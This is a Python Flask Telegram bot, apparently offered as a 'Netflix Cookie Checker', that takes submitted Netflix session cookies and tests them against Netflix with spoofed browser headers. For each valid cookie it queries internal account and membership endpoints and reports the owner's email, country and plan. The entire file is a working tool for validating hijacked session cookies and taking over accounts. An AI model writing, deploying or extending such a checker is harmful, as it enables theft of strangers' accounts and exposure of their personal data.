import os
import json
import requests
import re
from flask import Flask, request, jsonify

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
CHAT_ID = os.environ.get('CHAT_ID', 'YOUR_CHAT_ID_HERE')

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
}

def extract_cookie(text):
    patterns = [
        r'NetflixId=([^;\s]+)',
        r'ct=([A-Za-z0-9+/=_.-]+)',
        r'secureNetflix=([A-Za-z0-9+/=_-]+)'
    ]
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            return match.group(1)
    return None

def check_netflix(cookie_value):
    session = requests.Session()
    session.headers.update(HEADERS)
    
    session.cookies.set('secureNetflix', cookie_value)
    
    try:
        resp = session.get('https://www.netflix.com/browse', timeout=15)
        
        if resp.status_code == 200:
            if 'browse' in resp.text or 'profile' in resp.text:
                if 'login' not in resp.text.lower():
                    try:
                        account = session.get('https://www.netflix.com/api/shakti/viu/account', timeout=10)
                        membership = session.get('https://www.netflix.com/api/shakti/viu/membership', timeout=10)
                        
                        email = 'Unknown'
                        country = 'Unknown'
                        plan = 'Unknown'
                        
                        if account.status_code == 200:
                            acc_data = account.json()
                            email = acc_data.get('email', 'Unknown')
                            country = acc_data.get('country', 'Unknown')
                        
                        if membership.status_code == 200:
                            mem_data = membership.json()
                            plan = mem_data.get('planName', 'Premium')
                    except:
                        pass
                    
                    return True, email, country, plan
    except:
        pass
    
    return False, None, None, None

def send_message(text):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    data = {'chat_id': CHAT_ID, 'text': text, 'parse_mode': 'HTML'}
    try:
        requests.post(url, data=data, timeout=10)
    except:
        pass

@app.route('/')
def home():
    return 'Netflix Checker Bot is running!'

@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    data = request.get_json()
    if data and 'message' in data:
        msg = data['message']
        text = msg.get('text', '')
        
        if text == '/start':
            send_message('🎬 Netflix Cookie Checker Bot\n\nSend me a Netflix cookie and I will check it.')
        
        else:
            cookie = extract_cookie(text)
            if not cookie:
                send_message('❌ Could not extract cookie. Send format: secureNetflix=TOKEN')
            else:
                send_message('🔄 Checking cookie...')
                valid, email, country, plan = check_netflix(cookie)
                
                if valid:
                    msg = f'✅ COOKIE IS VALID!\n\n📧 Email: {email}\n🌍 Country: {country}\n📀 Plan: {plan}'
                    send_message(msg)
                else:
                    send_message('❌ Cookie is INVALID or EXPIRED')
    
    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
